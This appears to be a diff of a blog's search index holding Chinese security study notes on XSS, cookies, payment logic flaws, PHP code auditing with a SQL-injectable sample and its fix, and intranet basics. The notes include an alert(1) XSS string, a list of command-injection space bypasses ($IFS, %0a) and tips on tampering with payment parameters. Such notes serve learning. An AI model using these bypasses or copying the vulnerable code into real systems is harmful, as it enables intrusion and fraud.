+<p>DOM的规定如下：</p>
+<p>整个文档是一个文档节点；</p>
+<p>每个HTML标签是一个元素节点；</p>
+<p>包含在HTML元素中的文本是文本节点；</p>
+<p>每一个HTML属性是一个属性节点；</p>
+<p>节点与节点之间都有等级关系。</p>
+<p>HTML的标签都是一个个的节点，而这些节点组成了DOM的整体结构：节点树。如图所示：</p>
+<p><img src="https://image.3001.net/images/20210602/1622624351_60b7485f98c53cbc653a9.jpg!small" alt="img"></p>
+<p>简单来说，DOM为一个一个访问html的标准编程接口。</p>
+<p>可以发现DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段，是基于javascript的。而上面两种XSS都需要服务端的反馈来构造xss。</p>
+<p>参考文章：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于cookie的相关总结</title>
+    <url>/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h3 id="set-cookie格式（一个cookie）"><a href="#set-cookie格式（一个cookie）" class="headerlink" title="set cookie格式（一个cookie）"></a>set cookie格式（一个cookie）</h3><p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207125247970.png" alt="image-20230207125247970"></p>
+<p>expires的是否设定决定cookie保存在内存还是磁盘</p>
+ <span id="more"></span>
+
+<h3 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h3><p>若没有设定，则为短期cookie，保存于内存，关闭浏览器即失效</p>
+<p>若设定过期时间，则到过期时间失效，保存于磁盘</p>
+<p>（1）session保存在服务器端(客户端仅保存一个sessionID)，Cookie保存在客户端。</p>
+<p>（2）session保存的是对象，Cookie保存的是<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>。cookie的存储限制数据量不大于4KB，而session的容量则是无限量的。</p>
+<p>（3）session不能区分路径，同一个用户在访问同一个Web应用程序期间，所有的session在任何路径都可访问。Cookie中如果设置了路径参数，则在其他路径下无法访问。</p>
+<p>（4）session默认保存SeesionID的方法是Cookie，如果客户端禁用了Cookie，服务器端应采用其他的替代方法替代SessionID。</p>
+<p>（5）session在会话结束后就会关闭，但是Cookie可以经过持久化而长期保存在客户端的本地硬盘上。所以session也更安全。</p>
+<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207132732376.png" alt="image-20230207132732376"></p>
+<h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><p>获取cookie：<code>document.cookie;</code></p>
+<p>设置cookie: <code>document.cookie=&quot;username=yuanjiu&quot;;</code></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>cookie</tag>
       </tags>
   </entry>
   <entry>
@@ -649,292 +1074,6 @@
       </tags>
   </entry>
   <entry>
-    <title>xxe漏洞总结</title>
-    <url>/2023/02/11/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>业务逻辑漏洞</title>
-    <url>/2023/02/10/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>业务逻辑漏洞中，支付漏洞最常见，而支付漏洞一直以来就是是高风险，对企业来说危害很大，对用户来说同样危害也大。</p>
-<span id="more"></span>
-
-<h3 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h3><p><strong>要了解支付漏洞就要先了解商品的购买流程：</strong></p>
-<p>选择商品和数量**&#x3D;&gt;<strong>选择支付及配送方式</strong>&#x3D;&gt;<strong>生成订单编号</strong>&#x3D;&gt;<strong>订单支付选择</strong>&#x3D;&gt;**完成支付</p>
-<h3 id="常见参数："><a href="#常见参数：" class="headerlink" title="常见参数："></a>常见参数：</h3><p><strong>通过篡改参数来利用漏洞</strong></p>
-<p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p>
-<p>购买数量：改成负数，达到金额偏差</p>
-<p>订单号：用B商品的价格买A商品</p>
-<p>支付方式：更改支付接口，使金额支付到其它账户</p>
-<h3 id="常见修改方法："><a href="#常见修改方法：" class="headerlink" title="常见修改方法："></a>常见修改方法：</h3><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>逻辑越权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于cookie的相关总结</title>
-    <url>/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h3 id="set-cookie格式（一个cookie）"><a href="#set-cookie格式（一个cookie）" class="headerlink" title="set cookie格式（一个cookie）"></a>set cookie格式（一个cookie）</h3><p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207125247970.png" alt="image-20230207125247970"></p>
-<p>expires的是否设定决定cookie保存在内存还是磁盘</p>
- <span id="more"></span>
-
-<h3 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h3><p>若没有设定，则为短期cookie，保存于内存，关闭浏览器即失效</p>
-<p>若设定过期时间，则到过期时间失效，保存于磁盘</p>
-<p>（1）session保存在服务器端(客户端仅保存一个sessionID)，Cookie保存在客户端。</p>
-<p>（2）session保存的是对象，Cookie保存的是<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>。cookie的存储限制数据量不大于4KB，而session的容量则是无限量的。</p>
-<p>（3）session不能区分路径，同一个用户在访问同一个Web应用程序期间，所有的session在任何路径都可访问。Cookie中如果设置了路径参数，则在其他路径下无法访问。</p>
-<p>（4）session默认保存SeesionID的方法是Cookie，如果客户端禁用了Cookie，服务器端应采用其他的替代方法替代SessionID。</p>
-<p>（5）session在会话结束后就会关闭，但是Cookie可以经过持久化而长期保存在客户端的本地硬盘上。所以session也更安全。</p>
-<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207132732376.png" alt="image-20230207132732376"></p>
-<h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><p>获取cookie：<code>document.cookie;</code></p>
-<p>设置cookie: <code>document.cookie=&quot;username=yuanjiu&quot;;</code></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>cookie</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码审计总结</title>
-    <url>/2023/02/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><h4 id="1-可控变量"><a href="#1-可控变量" class="headerlink" title="1.可控变量"></a>1.可控变量</h4><p>​	接收变量如：get,post </p>
-<p>​	接收关键字：$_GET</p>
-<h4 id="2-特定函数"><a href="#2-特定函数" class="headerlink" title="2.特定函数"></a>2.特定函数</h4><p>​	输出 print echo</p>
-<p>​	数据库操作语句</p>
-<h4 id="3-搜索特定关键字寻找特定漏洞"><a href="#3-搜索特定关键字寻找特定漏洞" class="headerlink" title="3.搜索特定关键字寻找特定漏洞"></a>3.搜索特定关键字寻找特定漏洞</h4><p>​	如：select、insert、update等sql执行语句 &#x3D;&#x3D;&#x3D;》sql注入漏洞 </p>
-<p>​	如：搜索echo、print尝试挖掘xss漏洞</p>
-<p>​	如：<code>$_GET</code>、<code>$_post</code>&#x3D;&#x3D;》数据包漏洞</p>
-<span id="more"></span>
-
-<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><ol>
-<li>理解应用程序或系统的功能和架构。这有助于确定应该关注哪些部分的代码，并有助于识别潜在的安全漏洞。</li>
-<li>寻找输入验证不足的漏洞。输入验证是应用程序或系统保护自身免受恶意输入的第一道防线。不正确的输入验证可能导致诸如SQL注入、跨站脚本（XSS）和跨站请求伪造（CSRF）等安全漏洞。</li>
-<li>寻找敏感数据泄露的漏洞。这些漏洞可能导致应用程序或系统泄露敏感数据，如用户名、密码、信用卡信息等。</li>
-<li>寻找授权和身份验证问题。这些漏洞可能导致未经授权的用户访问敏感信息或执行敏感操作。</li>
-<li>检查代码是否存在逻辑错误。这些漏洞可能导致应用程序或系统的意外行为，例如未经授权的操作或意外数据泄露。</li>
-<li>使用自动化工具辅助代码审计。有许多工具可用于自动化代码审计过程，例如静态代码分析工具和漏洞扫描器。但是，自动化工具不是万能的，它们通常只能检测一些常见的漏洞，并可能会误报或漏报漏洞。</li>
-</ol>
-<h2 id="php代码审计案例"><a href="#php代码审计案例" class="headerlink" title="php代码审计案例"></a>php代码审计案例</h2><p>假设有一个 PHP 程序，它使用 POST 请求从客户端接收用户名和密码，然后将它们存储在 MySQL 数据库中。在这个程序中，存在 SQL 注入漏洞，攻击者可以使用特定的输入值绕过应用程序的输入验证，从而获得对数据库的非授权访问。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password) VALUES(&#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在上述代码中，输入验证的缺失在于，应用程序直接将接收到的 <code>$_POST[&#39;username&#39;]</code> 和 <code>$_POST[&#39;password&#39;]</code> 值插入 SQL 语句中，而没有对它们进行任何过滤或转义。因此，攻击者可以通过在输入中插入 SQL 语句，从而获得对数据库的非授权访问。</p>
-<p>要修复这个漏洞，可以使用预处理语句和参数化查询：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users(username, password) VALUES(?, ?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>使用预处理语句和参数化查询，应用程序会将输入值视为参数，而不是字符串。因此，即使攻击者尝试通过插入 SQL 语句来攻击应用程序，输入值也不会被视为 SQL 代码而被执行。</p>
-<h3 id="php代码审计要点"><a href="#php代码审计要点" class="headerlink" title="php代码审计要点"></a>php代码审计要点</h3><ol>
-<li>输入验证：验证输入数据的类型、长度、格式和范围，防止恶意用户提交非法输入数据。</li>
-<li>访问控制：限制用户对应用程序中的资源的访问权限，防止未授权的用户访问敏感信息。</li>
-<li>会话管理：确保会话ID的随机性和唯一性，验证会话数据的完整性和有效性，防止会话劫持和会话固定攻击。</li>
-<li>数据库安全：避免SQL注入攻击，使用预编译语句和参数化查询来处理用户输入的数据。</li>
-<li>文件上传：对上传的文件进行验证和过滤，限制上传的文件类型、大小和数量，防止文件包含漏洞和文件上传漏洞。</li>
-<li>输出过滤：对输出到浏览器的内容进行过滤和转义，防止跨站脚本攻击和HTML注入攻击。</li>
-<li>加密和解密：使用加密算法保护敏感数据的机密性，确保数据的完整性和可用性，防止加解密漏洞。</li>
-<li>错误处理：避免敏感信息泄漏，将错误信息记录到日志中，提供有用的错误信息提示给开发者，防止信息泄露。</li>
-<li>代码注释和文档：提供清晰的代码注释和文档，便于代码的维护和修改，防止代码混乱和漏洞。</li>
-</ol>
-<h4 id="trim-函数"><a href="#trim-函数" class="headerlink" title="trim() 函数"></a>trim() 函数</h4><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p>
-<h4 id="常见绕过空格命令分隔符"><a href="#常见绕过空格命令分隔符" class="headerlink" title="常见绕过空格命令分隔符"></a>常见绕过空格命令分隔符</h4><p>1、%0a符号：换行符</p>
-<p>2、%0d符号：回车符</p>
-<p>3、&lt; 号</p>
-<p>4、%09符号</p>
-<p>5、$IFS$9(数字无限制)符号</p>
-<p>6、${IFS}符号</p>
-<p>7、，号</p>
-<p>8、&lt;&gt;号</p>
-<p>9、$IFS符号</p>
-<p>10、以及过滤掉的内容</p>
-<h4 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord() 函数"></a>ord() 函数</h4><p>ord() 函数:返回字符串的首个字符的 ASCII 值。</p>
-<h4 id="REQUEST、-POST、-GET的区别和联系"><a href="#REQUEST、-POST、-GET的区别和联系" class="headerlink" title="$_REQUEST、$_POST、$_GET的区别和联系"></a>$_REQUEST、$_POST、$_GET的区别和联系</h4><ol>
-<li><code>$_REQUEST</code></li>
-</ol>
-<p>PHP中，<code>$_REQUEST</code>可以获取POST方法和GET方法提交的数据，但是传输的速度相对较慢。</p>
-<ol start="2">
-<li><code>$_GET</code></li>
-</ol>
-<p>$_GET用来获取由浏览器通过$_GET方法提交的数据。<code>$_GET</code>方法就是通过把参数数据加在提交表单的action属性所指的URL中，值和表单内的每个字段一一对应，并且在URL中可以看到，但是同样也存在问题：</p>
-<p>• 安全性差，在URL中可以体现</p>
-<p>• 传输数据量较小，不能大于2KB。</p>
-<ol start="3">
-<li><code>$_POST</code></li>
-</ol>
-<p>$_POST用来获取由浏览器通过POST方法提交的数据。<code>$_POST</code>方法是通过HTTP POST机制，将表单的各个字段放置在HTTP HEADER内一起传送到action属性所指的URL中，用户看不到此过程。提交的大小一般来说不受限制，但是具体根据服务器的不同，略有不同，比如PHP版本5.512，默认POST最大值为3M，有的则为8M，IIS6默认最大则为200K。</p>
-<p>相对于<code>$_GET</code>方法安全性稍高。</p>
-<ol start="4">
-<li>三者之间的区别和联系</li>
-</ol>
-<p><code>$_REQUEST</code>[“参数”]具有$_POST[“参数”]， <code>$_GET</code>[“参数”]的功能,但是<code>$_REQUEST</code>[“参数”]比较慢。通过$_POST和$_GET方法提交的所有数据都可以通过<code>$_REQUEST</code>数组[“参数”]获得。</p>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/340873.html">https://www.freebuf.com/articles/web/340873.html</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于xss的相关总结</title>
-    <url>/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站攻击，即Cross Site Script Execution(通常简写为XSS)，是前端的漏洞，产生在浏览器一端的漏洞。它是指攻击者在网页中嵌入客户端脚本，主要利用js编写的恶意代码来执行一些想要的功能，也就是说它能干嘛是受到js的控制，那么js能执行出什么脚本代码就取决于它能干嘛。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</p>
-<span id="more"></span>
-
-<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>是一种非持续型攻击。漏洞本身存在，但是需要攻击者构造出来，然后让对方去触发。它不会对正常的访问造成跨站攻击。这种攻击是一次型攻击，它不会写入到数据库里。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射。</p>
-<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135008161.png" alt="image-20230207135008161"></p>
-<h4 id="出现地方"><a href="#出现地方" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
-<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是一种持续型的攻击。将跨站代码植入到网站的数据库中。一旦攻击者第一次成功攻击之后，那么在后续的其他访问者均会受到跨站攻击。这种攻击可能是写到网站的留言板，那么当对方访问留言板就会被触发。它与反射型、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大区别在于反射型与DOM型XSS执行都必须依靠用户手动触发，而存储型XSS却不需要。</p>
-<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135110317.png" alt="image-20230207135110317"></p>
-<h4 id="出现地方-1"><a href="#出现地方-1" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
-<h3 id="xss的作用"><a href="#xss的作用" class="headerlink" title="xss的作用"></a>xss的作用</h3><p>常规用到的是盗取cookie、js做钓鱼攻击、流量指向等。主要是盗取管理员的会话和cookie信息，就是我们常说的管理员凭证，就意味着得到后台权限，可以直接利用。还能配合别的漏洞，比如可以和网页木马结合，扔到那里去跳转到网马地址，网马地址被执行后续就控制一些权限</p>
-<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p>
-<p>通过js可以重构整个HTML页面，而要重构页面或者页面中的某个对象，js就需要知道HTML文档中所有元素的“位置”。而DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。根据DOM规定，HTML文档中的每个成分都是一个节点。</p>
-<p>DOM的规定如下：</p>
-<p>整个文档是一个文档节点；</p>
-<p>每个HTML标签是一个元素节点；</p>
-<p>包含在HTML元素中的文本是文本节点；</p>
-<p>每一个HTML属性是一个属性节点；</p>
-<p>节点与节点之间都有等级关系。</p>
-<p>HTML的标签都是一个个的节点，而这些节点组成了DOM的整体结构：节点树。如图所示：</p>
-<p><img src="https://image.3001.net/images/20210602/1622624351_60b7485f98c53cbc653a9.jpg!small" alt="img"></p>
-<p>简单来说，DOM为一个一个访问html的标准编程接口。</p>
-<p>可以发现DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段，是基于javascript的。而上面两种XSS都需要服务端的反馈来构造xss。</p>
-<p>参考文章：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网基础</title>
-    <url>/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p><img src="/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png" alt="image-20230220133523195"></p>
-<span id="more"></span>
-
-<h2 id="相关基础概念"><a href="#相关基础概念" class="headerlink" title="相关基础概念"></a>相关基础概念</h2><h5 id="1-DMZ"><a href="#1-DMZ" class="headerlink" title="1.DMZ"></a>1.DMZ</h5><p>​		DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767?fromModule=lemma_inlink">防火墙</a>后外部网络的访问用户不能访问内部<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8/99096?fromModule=lemma_inlink">网络服务器</a>的问题，而设立的一个非安全系统与<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/3131501?fromModule=lemma_inlink">安全系统</a>之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571?fromModule=lemma_inlink">服务器</a>设施，如企业<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fromModule=lemma_inlink">Web服务器</a>、<a href="https://baike.baidu.com/item/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1926327?fromModule=lemma_inlink">FTP服务器</a>和<a href="https://baike.baidu.com/item/%E8%AE%BA%E5%9D%9B/158397?fromModule=lemma_inlink">论坛</a>等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
-<p><strong>即在两个防火墙之间，内网之外的区域</strong>，<strong>可以大大增加攻击难度</strong></p>
-<h5 id="2-工作组与域"><a href="#2-工作组与域" class="headerlink" title="2.工作组与域"></a>2.工作组与域</h5><p>​	<strong>工作组（Work Group）</strong>是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
-<p>​	<strong>缺点：</strong>缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制。只适合小规模用户的使用。</p>
-<p>​	如：学校宿舍，家庭网络</p>
-<p>​	<strong>攻击手段</strong>：arp欺骗，dns劫持</p>
-<p>​		<strong>注意：局域网攻击（如arp欺骗）并不适用于域</strong></p>
-<p>​	<strong>域</strong>：用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
-<p>​	<strong>域的功能和特点：</strong></p>
-<ul>
-<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
-<li>便捷的资源访问，能够很容易地定位到域中的资源。 用户依次登录就可以访问整个网络资源，集中地身份验证</li>
-<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
-</ul>
-<p>​	如：大超市，学校机房</p>
-<p>​	<strong>工作组与域的区别：</strong>工作组是对等网络，域是B&#x2F;S架构，集中式管理</p>
-<p><img src="https://img-blog.csdn.net/20181022145259655?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
-<h5 id="3-域控DC-Domain-Control"><a href="#3-域控DC-Domain-Control" class="headerlink" title="3.域控DC(Domain Control)"></a>3.域控DC(Domain Control)</h5><p>​		在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能应该要有至少两个域控。一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在DC中的。而有一台备份域控制（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。当域中的一台计算机安装了AD后，它就成了域控DC了。</p>
-<p><strong>即一个域中最高管理权限，最高用户，最高管理的一台服务器，一般来说，拿下DC就意味着拿下域</strong></p>
-<h5 id="4-活动目录AD-Active-Directory"><a href="#4-活动目录AD-Active-Directory" class="headerlink" title="4.活动目录AD(Active Directory)"></a>4.活动目录AD(Active Directory)</h5><p>​		活动目录AD是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有AD活动目录的服务器就是域控DC。</p>
-<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
-<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
-<p><strong>类似于策略组件，用于提供各种目录服务</strong></p>
-<h5 id="5-域结构"><a href="#5-域结构" class="headerlink" title="5.域结构"></a>5.域结构</h5><p>​	<strong>单域</strong></p>
-<p>​		在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
-<p>​	<img src="https://img-blog.csdn.net/20181022150802375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:50%;"></p>
-<p>​	<strong>父域与子域</strong></p>
-<p>​		第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。父域与子域之间默认建立起了双向信任关系。</p>
-<p>​	<strong>域树与域林</strong></p>
-<h5 id="6-linux域与windows域"><a href="#6-linux域与windows域" class="headerlink" title="6.linux域与windows域"></a>6.linux域与windows域</h5><p>​		linux上也有相对应的活动目录，但是要装LDAP环境，一般企业很少会用LDAP来管理，因为功能上不及域强大，而且用linux来管理要求技术人员门槛高，故linux更适合做服务器，而windows更适合域，所以一般遇到的域是windows域，当然域中包含linux服务器也是很常见的。</p>
-<h5 id="7-常用内网渗透流程"><a href="#7-常用内网渗透流程" class="headerlink" title="7.常用内网渗透流程"></a>7.常用内网渗透流程</h5><p>​		<strong>信息收集&#x3D;》权限提升&#x3D;》横向渗透&#x3D;》权限维持</strong></p>
-<p>参考文章：</p>
-<p><a href="https://blog.csdn.net/weixin_44110913/article/details/106760045">https://blog.csdn.net/weixin_44110913/article/details/106760045</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-        <tag>域</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>加密实验</title>
